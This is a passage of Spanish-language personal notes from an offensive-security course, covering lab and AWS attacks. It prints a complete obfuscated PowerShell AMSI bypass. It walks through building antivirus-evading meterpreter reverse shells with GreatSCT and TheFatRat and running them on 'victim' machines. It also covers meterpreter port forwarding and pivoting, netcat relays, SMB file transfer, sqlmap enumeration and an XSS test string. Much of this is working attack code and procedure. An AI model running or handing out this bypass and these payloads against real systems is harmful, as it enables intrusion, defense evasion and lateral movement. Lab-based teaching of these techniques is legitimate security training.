~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



En este caso ya inclusive pase el archivo que anteriormente decia que no se podia por el anti virus

Pueden probrar en ejecutar un comando de power view, recuerden que no es un archivo, es la ejecucion directa, no tuve que dar doble click , se ejecuto al momento de llegar

En mi caso ejecute Get-NetUser para ver todos los usuarios debajo de administrador.



Otra herramienta llamada AMSI.fail, esta lo que realiza es que nos genera los comandos codificados para inyectar en shell

Como este ejemplo

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#Matt Graebers Reflection method with WMF5 autologging bypass 
$V7ZJF9JMftpw=$null;$n3nu="System.$([ChaR](77+15-15)+[CHAR]([bYte]0x61)+[Char](70+40)+[CHaR]([bytE]0x61)+[CHAr](103+85-85)+[cHar]([byte]0x65)+[chaR](109)+[chAr]([byTE]0x65)+[chaR]([bYtE]0x6e)+[CHaR](116+103-103)).$([CHAR](38+27)+[CHaR](117)+[ChaR](116*97/97)+[CHaR]([bYtE]0x6f)+[chaR](20+89)+[chaR]([BYTE]0x61)+[chaR](116*98/98)+[CHar](65+40)+[CHAR](111+72-72)+[Char]([byte]0x6e)).$(('Ãmsí'+'Útíl'+'s').nORmaLIZe([chAR](70+4-4)+[CHaR](106+5)+[CHAR]([BYTe]0x72)+[CHAr](109)+[CHar](68)) -replace [char](2+90)+[CHar](112*96/96)+[cHAr](123+96-96)+[CHaR](77*44/44)+[cHar](110+46-46)+[ChaR](98+27))";$ve="+('ccjnh'+'dgt').norMALIZe([Char](70*37/37)+[cHar](111)+[ChaR]([BYte]0x72)+[ChAR]([BYte]0x6d)+[chAr](68+21-21)) -replace [CHAr](92*46/46)+[ChAR](112*64/64)+[CHar]([byTe]0x7b)+[cHaR](77+73-73)+[chAR]([BYte]0x6e)+[ChAR]([BytE]0x7d)";[Threading.Thread]::Sleep(1089);[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('$([CHar]([bYte]0x53)+[cHAR]([bYTE]0x79)+[chaR](115)+[cHar](116*30/30)+[ChAR]([ByTE]0x65)+[ChAR](109+19-19)).Type')), [Object]([Ref].Assembly.GetType($n3nu)),($([CHaR](71)+[chAr]([byte]0x65)+[chAR]([BYTe]0x74)+[cHaR](70*17/17)+[CHAR](38+67)+[CHaR](101+39-39)+[char](108+88-88)+[ChaR]([ByTe]0x64)))).Invoke($(('àmsíÍnítF'+'äìlèd').NorMaLIZe([CHar]([Byte]0x46)+[cHAR]([ByTe]0x6f)+[CHaR]([BYTe]0x72)+[CHAR](109*39/39)+[chaR]([BytE]0x44)) -replace [cHaR]([byTE]0x5c)+[ChaR]([bYte]0x70)+[char]([byTe]0x7b)+[cHAr]([Byte]0x4d)+[chaR](110)+[cHAr](125+71-71)),(("NonPublic,Static") -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($V7ZJF9JMftpw,$True);$kfoaqrnqfwlvogtmsuvlnrztivwo="+[ChAr]([ByTe]0x62)+[ChaR]([byte]0x70)+[cHAR]([BYte]0x61)+[chAr]([BYTE]0x78)+[ChAr](104*49/49)+[cHAR](105)+[cHAr]([BytE]0x73)+[CHAr]([BytE]0x6b)+[CHAr](104)+[cHAr]([bYte]0x77)+[CHaR](102+18-18)+[CHAR](102+14-14)+[ChAR]([bytE]0x6d)+[Char]([BYTE]0x63)+[chAr]([bYTe]0x64)";[Threading.Thread]::Sleep(1590)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Se ejecuto sin ningun problema





Y si funciona, peden cerrar y abrir la shell para comprobar .

Video 98

Ahora veremos herramientas automaticas que generan payloads para la evasion de seguridad.

Herramienta:GreatSCT

Paso para instalar

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/
cd setup
sudo ./setup.sh -c
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


La instalacion tarda bastante, le aparecera un cuadro para reniciar presionan NO y luego otro cuadro de configuracion y solo presionar ok, dejar que la instalacion siga su curso.

Luego de lo ejecutamos con sudo ../greatsct.py

Antes de continuar salimos con exit

Vamos hacia atras  y entramos a config para ejecutar la configuracion

sudo python3 update.py que esta dentro de config

luego ya podemos dar marcha atras y ejecutar sudo ./greatsct.py

con list veremos la herramienta bypass , luego use 1 y luego list

veremos todas las opciones de bypass ya que trabaja de la mano con meterpreter

Luego exit, volcamos linux a nuestra red privada y ejecutamos de nuevo

Una vez dentro de list de bypass probaremos con la opcion 16
regasm/meterpreter/rev_tcp.py

Y luego de use 16 sera como metasploit, set lhost  etc

Luego generate

Luego de nos preguntara que nombre le daremos, presionamos enter y se quedara por default el nombre payload

Nos dice lo siguiente


 [*] Language: regasm----como se escribe el lenguaje
 [*] Payload Module: regasm/meterpreter/rev_tcp ---el payload
 [*] DLL written to: /usr/share/greatsct-output/compiled/payload.dll---lo que pasarasa la maquina victima
 [*] Source code written to: /usr/share/greatsct-output/source/payload.cs---como se escribio
 [*] Execute with: C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U payload.dll---como lo debes de ejecutar en la maquina victima
 [*] Metasploit RC file written to: /usr/share/greatsct-output/handlers/payload.rc---configuarion con el fichero .rc
 
 
 copiamos al escritorio /usr/share/greatsct-output/compiled/payload.dll
 
ya saben cp y direccion


Luego de que el payload este en la maquina victima solo seria msfconsole -r /usr/share/greatsct-output/handlers para que se nos configure

y en la maquina victima ejecutamos donde esta el payload C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U payload.dll

En mi caso probe la mayoria y fueron detectados en las maquinas ws01 y ws02 windows 10, quedaria por cambiar la firma en la pagina que vimos y luego lanzar el codigo nuevamente, esto es una idea mia, pueden investigar mas formas de como si hacer que explote la maquina victima,
 
video 99

Otra herramienta mas conocida thefatrat

Para la evasion de firewall

REpositorio: https://github.com/StreetSec/FatRat

1. git clone https://github.com/Screetsec/TheFatRat.git
2. cd TheFatRat
3. sudo chmod +x setup.sh
4. sudo ./setup.sh

Al igual que la anterior tomara un tiempo en terminar.

Recordad, mientras mas popoluar la herramienta como esta mas propensa en que  los antivirus la detecten pero en esta hay actualizaciones frecuentes, nos ayudara en esa parte.

En el trascurso seria enter, yes , opcion 2 para la instalacion de una herramienta mas, luego enter para dejar el mismo directorio lo podran cambiar y por ultimo ‘y’ para que cree un acceso directo en nuestro escritorio.

luego de esto aun en nat vamos a home y ejecutamos sudo fatrat

luego de esto solo salir (17) enter para salir del modo nat y colocar en red privada

y entramos de nuevo sudo fatrat

Seleccionamos 2 y 2, no utilizaremos venoms la opcion 1 ya que al ser muy conocida sera detectada de inmediato, luego opcion 2 la version old para probar , ustedes pueden ir practicando con las demas opciones si gustan lo importante es aprender y dominar todas las herramientas que veran en el curso.

para mi suerte se compila en c asi que entendere mejor lo que realice y igual forma se compilara en c, nos pedira nuesto lhost y lport ya saben que hacer y continuamos.

Luego nos pedira para que plataforma elegimos 2 para 64 bits

Nos lanzara dos archivos o ejecutables , el primero que sera el original y el que esta compilado.


Antes de presionar enter copiamos el compilado hacia el escritorio, pueden abrir otra terminal e ir a la direccion de este.

Darle permiso para todo con chmod 777

Ya con esto la pasamos a la maquina victima, cabe destacar que la he lanzado a mi maquina host que esta actualizada hasta la fecha y no la ha detectado.

Importante ver qe tipo de payload ya que con esa informacion sabremos como configurar para escuchar,por suerte que guarde la imagen y sabemos que es reverse_tcp



Entonces vamos a metasploit y configuramos un windows meterpreter reverse_tcp

colocamos la misma informacion que colocamos en thefatrat, host y puerto

Pueden ver el transcurso con wireshark en la maquina victima al parecer alguna herramienta impide la conexion,  pueden verificar la firma y ver si la pueden hacer mas dificil de detectar.

Tambien pueden probar con cambiar la arquitectura y hacer el exploit a 32 bits.

Video 100

Os recordad estas herramientas para mi no las utilizo con frecuencia os las enseno para que conozcan todas o su mayoria y le saquen beneficio pero a la hora de realizar un trabajo profesional no sabemos el trasfondo de la ejecucion del codigo de estas herramientas o como explicarlas en un informe para una empresa, no es como anteriormente con c# que sabiamos que haciamos y que el codigo hacia y hasta donde.

Una vez que la herramienta no se actualice se vuelve absoleta.

Sabiendo esto comencemos el video no visual, jaja, para saber mas.

Otra herramienta vell-framework

msfmania

shelter



Entre otras

Video 102

Evasion de defensas y movilidad lateral

Herramienta: port forwarding

El Port Forwarding (o redirección de puertos) es una técnica utilizada en redes para permitir que dispositivos externos accedan a servicios dentro de una red privada a través del enrutador. Se configura para redirigir el tráfico entrante desde una dirección IP y puerto específicos hacia una IP y puerto internos dentro de la red local.

Es decir, desde internet a traves de un puerto con el router previamente configurado entraremos de una maquina con internet a una local de direccion privada o sin red.

Pentesting y Ciberseguridad: En pruebas de penetración, se usa para acceder a máquinas en redes privadas o establecer túneles de comunicación.


Ya con las herramientasantes vista, tenemos el acceso a cualquier maquina victima, en esta seccion primero deberan crear una seccion con meterpreter con unas de las maquinas, luego de tener la seccion abierta pueden comenzar.

Descargar netcat en la maquina victima, ultima version siempre

Luego de tenerla la ejecutamos a traves de shell ./ncat.exe -lvp 23
cualquier puerto y nos aparecera el firewall indicando que va a retringuir algunas acciones, desmarcamos y precionamos cancelar

Luego en la maquina kali netcat + ip maquina victima + el puerto que colocaron para crear una conexion veremos que no le llegan los mensajes por ejemplo un hola.





En mi caso la maquina victima tiene vulnerable ese puerto el 23 ustedes elijan a traves de un analizis el que sea vulnerable, como el firewall no prohibe la entrada , haremos un ataque arp ahora si veremos la herramienta port forwarding, haremos acceso de este puerto en la misma maquina con nuestra seccion meterpreter.



Son puerto que deben de estar abierto para su funcionamiento en la maquina victima pero lo que haremos sera aprovechar la brecha

EN kali en meterpreter > portfwd add -l 6666 -p 23 -r 192.168.0.2

Lo que haremos es > -l el puerto a donde kali le enviara trafico a la maquina victima -r la maquina victima se le enviara la respuesta a traves del -p 23 que es el puerto que es donde acepta conexiones al local host de la maquina kali


el -i 1 es para elminar ya la creada por si se comete algun error lo pueden hacer de nuevo sin salir de meterpreter







Ahora veremos como conectarnos a traves de la maquina empleado1 a la maquina empleado2, como no lo podemos hacer desde kali ya que no pertenece al grupo de dominio de server pero ya comprometimos a la maquina empleado1 lo que haremos es que atravez de ella alcanzaremos a a la maquina de la red del dominio server.

portfwd add -l 6666 -p 80 -r 192.168.0.8
[*] Forward TCP relay created: (local) :6666 -> (remote) 192.168.0.8:80

Lo que hara cuando hagamos un netcat es que cuando kali envie un trafico a la maquina empleado2 esta se lo enviara a la maquina empleado1 que fue la que colocamos en -r a traves del puerto 80. lo pueden visualizar usando wireshark



Ya acabamos de ver como burlar la seguridad de una maquina que esta dentro de un dominio nosotros estando fuera y solo invadiendo unas de las maquinas dentro de este, ya con esto podemos utilizar la maquina victima para atacar las demas maquinas, ya sea para realizar ataque Dos DDOs,  escaneo directo y mas.



Video 104

Herramienta Pivoting

Consiste en que la maquina que compremetemos dentro de un nodo, una red corportativa podamos acceder a las otras directamente a traves de esa maquina, ya sea con trafico, escaneo, envios de paquetes etc.

con ctrl + z enviamos la session al background, practicamente la guardaremos para poder seguir usando metasploit

Y con session podemos ver donde y como esta guardada





Luego 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
route add + ip de la maquina que no esta comprometida + mask de la red + session de meterpreter

route add 192.168.0.8 255.255.255.0 1

Esto capturara todo el trafico hacia esa maquina 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Verificar la session antes de 


Luego utilizar un modulo para escanear en meterpreter

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
use auxiliary/scanner/portscan/tcp

luego show options

En mi caso minimice los puetos de 100-150
y lrhost la maquina que no esta intervenida

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


por ultimo run

Que veran en wireshark que la maquina victima que enlazamos a meterpreter es quien analiza la maquina que no esta intervenida, la maquina kali no se presenta solo que unos paquetes a la maquina victima de vez en cuando.








Video 105 

netcat port-pivot relay

"Port-pivot relay" con Netcat se refiere a una técnica usada para redirigir el tráfico de un puerto a otro a través de una conexión intermedia. Este tipo de técnica puede ser utilizado, por ejemplo, en ataques de tipo pivoting, donde un atacante accede a una red interna y luego utiliza esa red para acceder a otros servicios de la red detrás de un firewall.

Veremos un ejemplo que puden hacer

Digamos que el puerto 23 esta interpectado por firewall pero es el que es vulnerable y queremos acceder, entonces usaremos el puerto para escuchar a traves de el.

En la maquina victima o en la que tienen la carpeta ncat que recordar que no fue detectada, en mi caso maquina wso2

.\ncat.exe -lvp 23  

Y en otro powershell

.\ncat.exe -lvp 40 | .\ncat.exe 192.168.0.2 23                    

Le decimos, hey como no puedo escuchar desde el puerto 23 , puedo acceder desde fuera al puerto 40 y le digo todo lo que escuches del puerto 23 interceptalo y envialo al puerto 40 para escuchar.

El resultado sera, si realizan una conexion al pueto 40 con la misma ip (maquina victima o kali) y envian un mensaje x por ejemplo enviando exploit al momento de cerrar la conexion el puerto escucha 40 lo intercepta y si cerramos tambien la segunda ventana creada todo el trafico se reedigira al puerto 23 donde no teniamos acceso.



Luego del mensaje anterior


se intercepta el trafico

luego que se detiene de donde se envio el mensaje tambien se detiene donde  se enlanzan los dos puerto






La primera imagen envia hola y que tal, la segunda imagen debajo es quien se encarga de enviar el mensaje del puerto 40 al 23 y la imagen de arriba es una escucha del puerto 23 donde se aprecia que los mensajes hola y que tal llegaron.

En linux seria:

creamos un fichero que sirva como intermediario mknod pivod p

Luego creamos un linte nc -lvp 23
Luego creamos como en windows otro puerto que escuche y que reedirija nc -lvp 40 0<pivot | nc 127.0.0.1 23 1>pivot
Por ultimo nc 127.0.0.1 40  y enviamos el mensaje hola y como ve en el terminal de cabezera que el mensaje hola llega al puerto 23

Para enviar entre maquinas en este caso de windows a linux

primero en kali
nc -lvp 23
nc -lvp 40 0<pivot | nc 192.168.0.9 23 1>pivot

Luego en windows

.\ncat.exe 192.168.0.9 40  
la ip de la maquina  adonde se enviara el mensaje, ahora ustedes haganlo viceversa


De kali a windows 

Windows: misma configuracion
.\ncat.exe -lvp 23
.\ncat.exe -lvp 40 | .\ncat.exe 192.168.0.2 23
.\ncat.exe -lvp 40

En kali: enviamos el mensaje a traves del fichero pivot con el tipo p que es Comunicación entre procesos (Pipes).
echo "gime you ip" > pivot   -----mensaje
cat pivot | nc 192.168.0.2 40 ----comando que envia el mensaje

En mi caso sali de cat pivot ctrl c para que en el puerto 23 llegara








Video 106 local tunneling localtunnel y Ngrok

Primero con la herramienta localtunnerl
sudo apt update
sudo apt install nodejs
sudo apt install npm

luego sudo npm install -g localtunnel

ya en kali localtunnel lt
seria lt -p 80
Esto nos arrojara un link que ingresen a su maquina host y veran la pagina apache de kali que vimos anteriormente



Utilicen por su cuenta ngrok, ya que es mas segura y se implementa para la auditoria de seguridad de una empresa, pruebenla.

video 107

Transferencia de archivos

Tendran un fichero con el mismo nombre del titulo de este video

Para esto vamos a compremeter la maquina victima en mi caso WS02, ya sea con meterpreter o cualquier otro fichero que anteriormente hemos logrado acceder.

Si no se acuerdan del puerto solo seria lanzarlo y wireshark les diria.

1 era forma


Como muestra la imagen, accedemos a la maquina victima, creamos un fichero en mi caso llamado bandera que he colocado "estoy aqui" dentro de la carpeta ficher, y el puente que seria python2 -m simplehttpserver mas el puerto si desean no lo colocan y por default sera el 8000, en mi caso coloque 8080


Ya seria colocar el comando en windows que recibira y le cambie al nombre prueba.txt

Y diras pero asi mejor la arrastro y listo, pues os mostrare la forma de hacerlo desde meterpreter sin necesidad de poner la mano en windows

escribimos shell
luego el comando: 

y ya con esto 


Tambien si es para hacerlo de linux a linux seria




2 da forma

Cambiar el nombre y el mensaje para verificar que se ejecute bien 

con mv cambien el nombre




Esta segunda forma seria con smb, hariamos que la carpeta que creamos “fichero” se convierta en una carpeta compartida en la maquina windows y como ya sabran seria como un tunel para pasar archivos

comando :

impacket-smbserver -smb2support test .

si luego van a una carpeta y colocan como direccion de ruta \\ip kali

Mostrara la carpeta compartida que en mi caso como indica el comando anterior se llama test 




Si lo queremos hacer desde meterpreter es decir shell, misma consola
Seria

copy \\ip kali\nombre de carpeta compartida\fichero + nombre para copiar , cualquiera






Hay otras mas formas y pueden descubrir mas, recuerden que este no es un curso de solo aprender lo que esta plasmado , es solo una plantilla para continuar el sendero hacker, las demas formas no las mostrare ya que firewall las detecta y para mi son malas practicas, las dos formas que les mostre no se detectan y son faciles de usar.

Video 110-112-113-114

Aqui veremos e entorno real, ya que el curso anterior y este si aplican todas las herramientas y conocimientos no tendra efecto ya que no es lo mismo una maquina virtual que una empresa privada con balanceadores , waf etc, en este apartado se crearan entorno real en la nube (AWS), con dos servidores publicos y una privada en donde estara la base de datos con mysql .

Este apartado es de pago por amazon, al momento de comenzar deben de continuar y acabar desde ahora el curso ya que si se olvidan tendra recargo, es comenzar este apartado en que solo restan 8 videos y cerrar el entorno para que amazon no cobre recargos, no me hago responsable ya dicho esto comenzamos.

Se dirigen a : https://aws.amazon.com/es/console/
aws console en interfaz de usuario.

Crean perfil , esta parte es un poco incomoda ya que hay que registrar la tarjeta, luego de colocarla seria usuario normal no root y version gratuita.

video 115

Podemos ver aws pentesting en vuestro navegador para poder ver que si o no podemos realizar como auditores en nuestra o de una empresa en servidores de amazon

En este punto realizaremos auditoria en nuestro dominio creado de aws

Desde fuera cabe destacar, es como si una empresa solo nos diera el nombre de nuestro dominio nada mas.

Lo primero seria usar ping + el nombre del dominio “ejemplo.com” si esta usa regla como la de nosotros no tendra ninguna respuesta ya que el balanceador actua como firewall y solo permite trafico http y solo a las dos maquinas creadas a ninguna otra.

Tambien podemos usar la principal nmap

nmap -sn + dominio 



Con este dominio nos arroja la ip que dice que es del dominio, en mas casos muestra mas dominios como subdominios asociados a esta a traves de un reverse dns de nmap

Luego de esto seria utilizar -O, -sS, -sV con -Pn en mi caso que me lo indico
y no salgan de estos analisis, cualquier ataque que sobrepase el balanceador sera cobrado en la tarjeta, luego de terminar el curso y quieren explorar otras opciones entonces si.

Quizas puedan ver algo pero no sera del todo cierto ya que el balanceador apantalla la informacion por otra

herramienta: lbd

+ nombre del dominio

Esta herramienta nos detecta si el dominio tiene balanceador 

Omitan esta parte y solo vean resumenes de videos ya que como os dije anteriormente todo lo que sobrecargue el servidor tendra costo

pagina para un articulo interesante y es como saber si estamos enfrente de un balanceador o una pagina real

sans white paper load balancing detection - sans.org

con la ip o nombre a traves de shodan,censys y mas

En estas paginas nos podemos dar cuenta en nuestro caso un error muy pero muy comun , que es un error de configuracion y es que colocan las maquinas directamente con ip publica en vez de pasarla por el balanceador y que este trabaje esta parte. por ejemplo en nuestro caso las dos maquinas publicas tienen asignadas ip y aunque tengas balanceadores ya por el simple hecho de tener la ip y no estar configurada las ip a traves del balanceador ya estan expuestas.

Video 116

En esta oacion veremos una brecha que dejamos a traves de kali y es que creamos nuestras instancias en servidores publicos con ip asignadas , este error de configuracion podemos acceder a las instancias sin necesidad de pasar por el balanceador.

A traves de shodan o cenys podemos ver que la ip pertenece a x dominio

Primero escaneremos la ip publuca de la primera instancia

un simple escaneo de nmap -sV + ip

Si en unos de los resultados les presenta TCP Wrappers , esto le explico que es practicamente como un firewall que utiliza aws para ocultar informacion en contra herramientas como nmap.


Ustedes pueden utilizar otro comando

Pueden ver los puertos que se puedan explotar como smtp, enumerar usuario con nc envar correos falsos (spoofing)

Para el puerto con http usar nikto

gobsuter para enumerar directorios

sqlmap para injection

a los puertos tcp usar rcpinfo para enumerar servicios disponibles

tambien msfconsole

Para puertos smb enum4linux y sbmvlient para enumerar recursos compartidos y listat archivos compartidos

para tcp imap y algunos anteriores podran usar hydra

puertos con snmpwalk para enumerar informacion

snmp-check para explotar vulnerabilidades

Pueden colocar al final de la linea de comando de nmap | awk '!/unknown/', para que solo se muestren los servicios que estan abiertos con el nombre de servicio y que no presente puertos unknown

Entre otras que pueden indagar y verificar si se pueden explotar o no, tomad en cuenta que algunos puertos son de bajos riesgos o dificil de explotar ya sea porque las vulnerabilidades ya son conocidas o estan en desuso.

Estas vulnerabilidades se pueden detener si en la confuguracion de segguridad de grupo de aws colocamos las instancias que solo perciban del protocolo http y ssh dentro de sbl dentro de nuestro grupo de seguridad creado y que no cualquiera pueda acceder a ellas, cuando intentemos escanear nos dira que el host esta down .

Puede realizar ataques de sqlmap automatizado lo cual recuerden generara costo, solo os digo las opciones que tenemos, en este caso probe en la instancia 1 con "><script>alert(1234)</script>

Ustedes pueden utilizar cualquiera.

sqlmap -u "http://ip/vulnerable.php?id=1" --dbs

enumerar tabla: sqlmap -u "http://ip/vulnerable.php?id=1" -D nombre_basedatos --tables

etc

Como evitar que sean efectivos estos ataques en aws nuestro servidor. seria utilizando un WAF, ya mencionado anteriormente cuando hablamos de balanceadores.


Para ingresar a la instancia 1

chmod 400 APPSERVER1-keypair1.pem 

sudo ssh -i "APPSERVER1-keypair1.pem" ec2-user@ip

Recordad que deben de tener la clave en donde ejecuten los codigos en mi caso esta en el escritorio y todo esto se realiza luego de haber tenido exito al entrar a la instancia y obtener la clave..

Una vez dentro intalaremos nmap , como es un servidor de red hat seria yum o def segun la version , en mi caso

sudo yum install nmap 
y
y listo

Luego de esto seria nmap -sn 10.0.0.0/24 ya que es el rango con el que creamos las instancias.

Luego de esto nos lanzara la ip del servidor o el balanceador, luego de esto con nmap y -sS 

obtuve :


Se pregunttran hey Alberto y donde esta la base de datos, pues la base de datos se configuro de tal manera solo pueda recibir conexion en un puerto en especifico, como lo podremos encontrar, seria a traves de un escaneo personalizado con nmap, puede ser :

sudo nmap -sS -p aqui poedemos colocar el puerto especifico que muestra aws en la base de datos que esta en secuity gruop o podemos lanzar un analisis de x puerto a x puerto y poco a poco dar con el que seria el verdadero trabajo de un hackig etico, + 10.0.0.0/24 o la secuencia que colocaron en mi caso es asi. para que analise esa cantidad de puertos en esas posibles direcciones ip, ya esto sera un ataque fuerte lo cual tendra un tiempo alargado no solo por los puertos sino que analizaran por /24 la direccion.

Como es prueba intentenlo directamente con el puerto que le indican y luego hagan la prueba mas real de como seria ya que no le dejaran abierta la ventana de aws con la configuracion del servidor.

Con esto le debera de aparecer puerto tal de su base de datos en state open y service mysql

luego podemos hacer nc ip + puerto para una conexion

Ya con esto nos muestra la verison con la que creamos la base de datos mysql y con este dato podemos explotar con msfconsole

o 
mysql -h + ip del servidor -u nombre de usuario -p nombre de base de datos
clave:

video 118

Aqui podran crear instancia, security group para un auditor , imaginad que la empresa lo dejara con una instancia para continuar realizando sus servicios y su auditor haga el suyo sin intervenir, tendra la misma red dentro del dominio de la empresa.

Esto seria todo, continuen practicando.
